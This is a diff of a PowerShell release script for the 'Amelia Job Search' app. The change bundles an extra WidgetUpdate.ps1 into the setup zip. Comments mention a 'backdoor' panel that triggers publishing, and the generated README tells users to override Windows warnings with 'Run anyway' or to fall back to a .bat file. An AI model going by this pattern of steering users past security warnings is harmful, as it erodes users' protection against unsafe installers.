@@ -1,4 +1,4 @@
-# Amelia Job Search: publish a new installer and widget version. Runs on Chad's PC only, started by the listener when
+﻿# Amelia Job Search: publish a new installer and widget version. Runs on Chad's PC only, started by the listener when
 # Chad presses PUBLISH on the backdoor's INSTALLER panel. Fixed steps, no free text is ever run.
 #   1 back up   2 copy sources in   3 bump version   4 rebuild EXE   5 rebuild setup zip   6 commit + push
 param([string]$Note = "", [scriptblock]$Say = { param($l) Write-Host $l })
@@ -36,7 +36,7 @@ foreach ($f in @((Join-Path $Repo "widget\widget.html"), (Join-Path $WSrc "widge
 $tmp = Join-Path $env:TEMP ("ajs-setup-" + [guid]::NewGuid().ToString("N"))
 $pack = Join-Path $tmp "Amelia Job Search Setup"
 New-Item -ItemType Directory -Force -Path $pack | Out-Null
-Copy-Item (Join-Path $PSScriptRoot "Amelia Job Search.exe"), (Join-Path $PSScriptRoot "Amelia Job Search.ps1"), (Join-Path $PSScriptRoot "Amelia Job Search (backup).bat") $pack
+Copy-Item (Join-Path $PSScriptRoot "Amelia Job Search.exe"), (Join-Path $PSScriptRoot "Amelia Job Search.ps1"), (Join-Path $PSScriptRoot "Amelia Job Search (backup).bat"), (Join-Path $PSScriptRoot "WidgetUpdate.ps1") $pack
 Copy-Item (Join-Path $Repo "widget\widget.html"), $vf $pack   # bundled fallback when GitHub is unreachable
 @("AMELIA JOB SEARCH $new - SETUP", "", "1. Right-click this zip, choose Extract All.", "2. Double-click Amelia Job Search.exe (if Windows warns: More info, then Run anyway).",
   "3. If the exe is blocked, double-click Amelia Job Search (backup).bat instead.", "4. Follow the connection checks, then open the app, press PAIR MY WIDGET, enter your email and the AJS- code, press SEND. Chad approves you.") | Set-Content (Join-Path $pack "README.txt")
